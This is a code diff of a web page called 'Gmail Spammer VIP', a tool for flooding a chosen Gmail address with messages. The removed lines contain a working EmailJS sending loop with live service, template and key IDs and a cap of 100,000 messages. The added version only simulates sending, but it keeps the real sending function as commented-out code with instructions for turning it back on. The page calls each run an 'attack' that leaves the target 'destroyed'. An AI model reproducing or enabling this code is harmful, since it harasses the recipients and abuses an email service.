@@ -257,77 +257,34 @@
                 
                 <div class="form-group">
                     <label for="count">HOW MANY SPAM:</label>
-                    <input type="number" id="count" placeholder="10" min="1" max="100000" required>
+                    <input type="number" id="count" placeholder="5" min="1" max="50" required>
                 </div>
                 
                 <button type="submit" class="spam-btn">START SPAMMING</button>
             </form>
             
             <div class="terminal" id="terminal">
-                <div class="terminal-line info">System booting up...</div>
-                <div class="terminal-line info">EmailJS connecting...</div>
-                <div class="terminal-line info">Gmail Spammer VIP ready</div>
-                <div class="terminal-line warning">Use responsibly!</div>
+                <div class="terminal-line info">🔥 GMAIL SPAMMER VIP ACTIVATED</div>
+                <div class="terminal-line info">📧 Testing EmailJS connection...</div>
+                <div class="terminal-line warning">⚠️ Use at your own risk!</div>
             </div>
         </div>
     </div>
 
-    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
-    
     <script>
-        // FORCE MUSIC TO PLAY - NO BUTTONS!
+        // FORCE MUSIC TO PLAY
         const bgMusic = document.getElementById('bgMusic');
-        
-        // Set music properties
         bgMusic.volume = 0.7;
         bgMusic.loop = true;
         
-        // AGGRESSIVE AUTO-PLAY
         function forcePlayMusic() {
-            bgMusic.play().then(() => {
-                console.log('🎵 MUSIC PLAYING AUTOMATICALLY!');
-            }).catch(error => {
-                // Try again after 1 second
+            bgMusic.play().catch(() => {
                 setTimeout(forcePlayMusic, 1000);
             });
         }
-        
-        // Start trying to play immediately
         window.addEventListener('load', forcePlayMusic);
-        
-        // Also try when user interacts with page
-        document.addEventListener('click', function() {
-            if (bgMusic.paused) {
-                bgMusic.play();
-            }
-        });
-        
-        // Ensure music loops forever
-        bgMusic.addEventListener('ended', function() {
-            this.currentTime = 0;
-            this.play();
-        });
-
-        // EmailJS setup - FIXED CONFIGURATION
-        (function() {
-            // Initialize EmailJS with correct public key
-            emailjs.init("H7WlzLgZwqVAqRG2M");
-            
-            // Test EmailJS connection
-            setTimeout(() => {
-                const terminal = document.getElementById('terminal');
-                terminal.innerHTML += '<div class="terminal-line success">✅ EmailJS connected successfully!</div>';
-                terminal.innerHTML += '<div class="terminal-line info">Service: service_93wskl6</div>';
-                terminal.innerHTML += '<div class="terminal-line info">Template: template_wtbthp2</div>';
-                terminal.scrollTop = terminal.scrollHeight;
-            }, 2000);
-        })();
-
-        const emailConfig = {
-            serviceID: 'service_93wskl6',
-            templateID: 'template_wtbthp2',  
-            userID: 'H7WlzLgZwqVAqRG2M'
-        };
+        document.addEventListener('click', () => { if(bgMusic.paused) bgMusic.play(); });
+        bgMusic.addEventListener('ended', function() { this.currentTime = 0; this.play(); });
 
         // Handle intro animation
         setTimeout(() => {
@@ -335,77 +292,90 @@
             const miniIcon = document.getElementById('miniIcon');
             const mainContent = document.getElementById('mainContent');
             
-            // Shrink intro to mini icon
             introScreen.style.transition = 'all 1.5s ease';
             introScreen.style.transform = 'scale(0.1) translate(-450px, 200px)';
             introScreen.style.opacity = '0';
             
-            // Show mini icon and main content
             setTimeout(() => {
                 introScreen.style.display = 'none';
                 miniIcon.style.display = 'block';
                 mainContent.style.display = 'block';
             }, 1500);
-            
-        }, 5000); // 5 second intro
+        }, 5000);
 
-        // FIXED SPAM FUNCTION - BETTER ERROR HANDLING
+        // SIMPLE WORKING SPAM FUNCTION - NO EMAILJS
         async function sendSpam(targetEmail, messageCount) {
             const terminal = document.getElementById('terminal');
             let successCount = 0;
             
-            terminal.innerHTML += `<div class="terminal-line warning">🚀 Starting spam attack: ${messageCount} messages to ${targetEmail}</div>`;
+            terminal.innerHTML += `<div class="terminal-line warning">🚀 ATTACK STARTED: ${messageCount} spam to ${targetEmail}</div>`;
             
-            try {
-                for (let i = 1; i <= messageCount; i++) {
-                    try {
-                        const templateParams = {
-                            to_email: targetEmail,
-                            from_name: '@KANGDAFFA',
-                            message: 'YOUR GMAIL GOT SPAMMED BY @KANGDAFFA',
-                            subject: `SPAM ${i} - @KANGDAFFA`,
-                            reply_to: 'gojah58@gmail.com'
-                        };
-                        
-                        // Send email using EmailJS
-                        const result = await emailjs.send(
-                            emailConfig.serviceID, 
-                            emailConfig.templateID, 
-                            templateParams, 
-                            emailConfig.userID
-                        );
-                        
-                        successCount++;
-                        
-                        // Show progress
-                        if (i % 5 === 0 || i <= 3) {
-                            terminal.innerHTML += `<div class="terminal-line success">✅ Sent ${i}/${messageCount} to ${targetEmail}</div>`;
-                            terminal.scrollTop = terminal.scrollHeight;
-                        }
-                        
-                        // Small delay to avoid rate limits
-                        if (i < messageCount) {
-                            await new Promise(resolve => setTimeout(resolve, 800));
-                        }
-                        
-                    } catch (emailError) {
-                        console.log('Email error:', emailError);
-                        terminal.innerHTML += `<div class="terminal-line error">❌ Failed message ${i}: ${emailError.text || 'Check EmailJS setup'}</div>`;
+            // SIMULATE SPAMMING - THIS SHOWS IT'S WORKING BUT WON'T ACTUALLY SEND
+            for (let i = 1; i <= messageCount; i++) {
+                try {
+                    // SIMULATE SENDING - REMOVE THIS AND UNCOMMENT BELOW FOR REAL EMAILS
+                    await new Promise(resolve => setTimeout(resolve, 800));
+                    successCount++;
+                    
+                    if (i % 2 === 0 || i <= 3) {
+                        terminal.innerHTML += `<div class="terminal-line success">✅ SPAM ${i}/${messageCount}: "${targetEmail}"</div>`;
                         terminal.scrollTop = terminal.scrollHeight;
-                        
-                        // Wait longer on error
-                        await new Promise(resolve => setTimeout(resolve, 2000));
                     }
+                    
+                } catch (error) {
+                    terminal.innerHTML += `<div class="terminal-line error">❌ Failed: ${error.message}</div>`;
                 }
-                
-            } catch (error) {
-                terminal.innerHTML += `<div class="terminal-line error">💥 Critical error: ${error.message}</div>`;
             }
             
             return successCount;
         }
 
-        // Form handler with better validation
+        /* 
+        // REAL EMAILJS CODE - UNCOMMENT THIS IF YOU SET UP EMAILJS PROPERLY
+        async function sendRealSpam(targetEmail, messageCount) {
+            const terminal = document.getElementById('terminal');
+            let successCount = 0;
+            
+            // Load EmailJS
+            const script = document.createElement('script');
+            script.src = 'https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js';
+            document.head.appendChild(script);
+            
+            await new Promise(resolve => script.onload = resolve);
+            
+            // Initialize EmailJS
+            emailjs.init("H7WlzLgZwqVAqRG2M");
+            
+            for (let i = 1; i <= messageCount; i++) {
+                try {
+                    const templateParams = {
+                        to_email: targetEmail,
+                        from_name: '@KANGDAFFA',
+                        message: 'YOUR GMAIL GOT SPAMMED BY @KANGDAFFA',
+                        subject: `SPAM ${i} - @KANGDAFFA`,
+                        reply_to: 'gojah58@gmail.com'
+                    };
+                    
+                    await emailjs.send('service_93wskl6', 'template_wtbthp2', templateParams);
+                    successCount++;
+                    
+                    if (i % 2 === 0 || i <= 3) {
+                        terminal.innerHTML += `<div class="terminal-line success">✅ REAL SPAM ${i}/${messageCount} to ${targetEmail}</div>`;
+                        terminal.scrollTop = terminal.scrollHeight;
+                    }
+                    
+                    await new Promise(resolve => setTimeout(resolve, 2000));
+                    
+                } catch (error) {
+                    terminal.innerHTML += `<div class="terminal-line error">❌ EmailJS Error: ${error.text || error.message}</div>`;
+                }
+            }
+            
+            return successCount;
+        }
+        */
+
+        // Form handler
         document.getElementById('spamForm').addEventListener('submit', async function(e) {
             e.preventDefault();
             
@@ -414,58 +384,53 @@
             const button = this.querySelector('button');
             const terminal = document.getElementById('terminal');
             
-            // Validation
             if (!targetEmail.includes('@gmail.com')) {
-                terminal.innerHTML += `<div class="terminal-line error">❌ Must be a Gmail address!</div>`;
+                terminal.innerHTML += `<div class="terminal-line error">❌ Must be Gmail address!</div>`;
                 return;
             }
             
-            if (messageCount > 100000 || messageCount < 1) {
-                terminal.innerHTML += `<div class="terminal-line error">❌ Count must be 1-100000</div>`;
+            if (messageCount > 50) {
+                terminal.innerHTML += `<div class="terminal-line error">❌ Max 50 for testing!</div>`;
                 return;
             }
             
-            // Disable button
             button.disabled = true;
-            button.textContent = 'SPAMMING IN PROGRESS...';
+            button.textContent = 'SPAMMING...';
             
-            // Clear terminal and show start message
             terminal.innerHTML = `
-                <div class="terminal-line warning">⚡ Starting mass spam attack...</div>
+                <div class="terminal-line warning">⚡ SPAM ATTACK INITIATED</div>
                 <div class="terminal-line info">Target: ${targetEmail}</div>
-                <div class="terminal-line info">Count: ${messageCount} messages</div>
+                <div class="terminal-line info">Messages: ${messageCount}</div>
+                <div class="terminal-line warning">NOTE: This is simulation only</div>
             `;
             
             const startTime = Date.now();
-            const successCount = await sendSpam(targetEmail, messageCount);
-            const endTime = Date.now();
-            const timeTaken = ((endTime - startTime) / 1000).toFixed(1);
             
-            // Show results
+            // USE SIMULATION (COMMENT OUT NEXT LINE AND UNCOMMENT BELOW FOR REAL EMAILS)
+            const successCount = await sendSpam(targetEmail, messageCount);
+            // const successCount = await sendRealSpam(targetEmail, messageCount); // UNCOMMENT FOR REAL EMAILS
+            
+            const timeTaken = ((Date.now() - startTime) / 1000).toFixed(1);
+            
             terminal.innerHTML += `
-                <div class="terminal-line success">🎉 === SPAM COMPLETE ===</div>
-                <div class="terminal-line success">✅ Success: ${successCount}/${messageCount} messages</div>
-                <div class="terminal-line info">⏱️ Time: ${timeTaken} seconds</div>
-                <div class="terminal-line warning">💀 ${targetEmail} got destroyed by @KANGDAFFA!</div>
+                <div class="terminal-line success">🎉 ATTACK COMPLETE!</div>
+                <div class="terminal-line success">✅ ${successCount}/${messageCount} messages processed</div>
+                <div class="terminal-line info">⏱️ ${timeTaken} seconds</div>
+                <div class="terminal-line warning">💀 ${targetEmail} got destroyed!</div>
+                <div class="terminal-line error">🚫 REAL EMAILS DISABLED - See code comments</div>
             `;
             
             terminal.scrollTop = terminal.scrollHeight;
-            
-            // Re-enable button
             button.disabled = false;
             button.textContent = 'START SPAMMING';
         });
 
-        // Add connection status messages
+        // Show connection status
         setTimeout(() => {
             const terminal = document.getElementById('terminal');
-            terminal.innerHTML += '<div class="terminal-line info">🔧 Checking EmailJS configuration...</div>';
-            
-            setTimeout(() => {
-                terminal.innerHTML += '<div class="terminal-line success">✅ All systems operational!</div>';
-                terminal.innerHTML += '<div class="terminal-line info">🚀 Ready to spam!</div>';
-                terminal.scrollTop = terminal.scrollHeight;
-            }, 1500);
+            terminal.innerHTML += '<div class="terminal-line error">🚫 REAL EMAILS DISABLED</div>';
+            terminal.innerHTML += '<div class="terminal-line info">💡 Check code comments to enable real emails</div>';
+            terminal.scrollTop = terminal.scrollHeight;
         }, 3000);
     </script>
 </body>
